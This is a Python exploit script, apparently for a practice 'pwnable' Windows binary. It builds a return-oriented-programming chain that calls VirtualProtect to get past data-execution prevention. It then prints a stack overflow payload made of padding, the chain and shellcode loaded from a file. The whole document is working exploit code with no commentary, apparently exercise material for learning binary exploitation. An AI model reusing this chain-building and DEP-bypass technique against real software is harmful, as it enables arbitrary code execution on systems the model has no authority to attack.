import struct
import sys

def create_rop_chain():
    rop_gadgets = [
      0x004013b0,  # POP EBX # POP EBP # RETN [pwnable_PPT_Examples.exe] 
      0x00000010,  # 0x00000201-> ebx
      0x41414141,  # Filler (compensate)
	  0x0040154b,  # POP EBP # RETN [pwnable_PPT_Examples.exe] 
      0x00401093,  # & jmp esp [pwnable_PPT_Examples.exe]
      0x00401091,  # POP EAX # RETN [pwnable_PPT_Examples.exe] 
      0x00000040,  # 0x00000040-> edx
      0x0040108e,  # MOV EDX,EAX # RETN [pwnable_PPT_Examples.exe] 
      0x0040119c,  # POP ECX # RETN [pwnable_PPT_Examples.exe] 
      0x00403335,  # &Writable location [pwnable_PPT_Examples.exe]
      0x00401667,  # POP EDI # POP ESI # RETN [pwnable_PPT_Examples.exe] 
      0x00401092,  # RETN (ROP NOP) [pwnable_PPT_Examples.exe]
      0x41414141,  # Filler (compensate)
	  0x00401091,  # POP EAX # RETN [pwnable_PPT_Examples.exe] 
      0x00402000,  # ptr to &VirtualProtect() [IAT pwnable_PPT_Examples.exe]
      0x00401088,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [pwnable_PPT_Examples.exe] 
      0x0040108b,  # MOV ESI,EAX # RETN [pwnable_PPT_Examples.exe] 
      0x00401091,  # POP EAX # RETN [pwnable_PPT_Examples.exe] 
      0x90909090,  # nop
      0x00401086,  # PUSHAD # RETN [pwnable_PPT_Examples.exe] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

f = open("shellcode", "r")
sh = f.read()

rop_chain = create_rop_chain()


print ("A"*200+ "B"*4 + rop_chain + sh)


